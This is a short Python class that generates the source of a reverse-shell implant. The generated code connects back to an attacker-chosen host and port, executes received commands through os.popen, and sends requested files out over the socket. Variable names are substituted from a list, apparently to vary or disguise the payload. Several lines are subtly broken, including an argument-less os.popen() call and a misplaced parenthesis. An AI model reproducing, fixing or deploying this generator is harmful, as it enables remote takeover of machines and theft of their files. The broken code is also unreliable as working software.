class Payload:
    def __init__(self, host: str, port: int, strs: list):
        self.host, self.port, self.strs = host, port, strs

    def create(self):
        return """
def {sendfile}(file, conn):\n\tconn.send("!!!".encode("UTF-8"))
\twith open(file , 'rb') as f:
\t\tconn.send(str(len(f.read())).encode("UTF-8"))\n\t\tconn.send(f.read())
\t\tconn.send(file.strip(os.path.dirname(file))).encode("UTF-8")
{connected} = False
while not {connected}:\n\ttry:\n\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
\t\tconn.connect(('{host}', int({port})))
\t\t{connected} = True
\texcept:\n\t\t{connected} = False\n\telse:\n\t\tconn.send((sys.platform).encode("UTF-8"))
while connected:\n\t\ttry:
\t\t\tc = conn.recv(1024).decode("UTF-8")
\t\t\tif c.startswith("!!!"):{sendfile}(c.strip('!!!'), conn)
\t\t\telse : conn.send(os.popen().read().encode("UTF-8"))\n\t\texcept:\n\t\t\t{connected} = False
""".format(port=str(self.port), host=self.host, connected=self.strs[0],sendfile = self.strs[1])
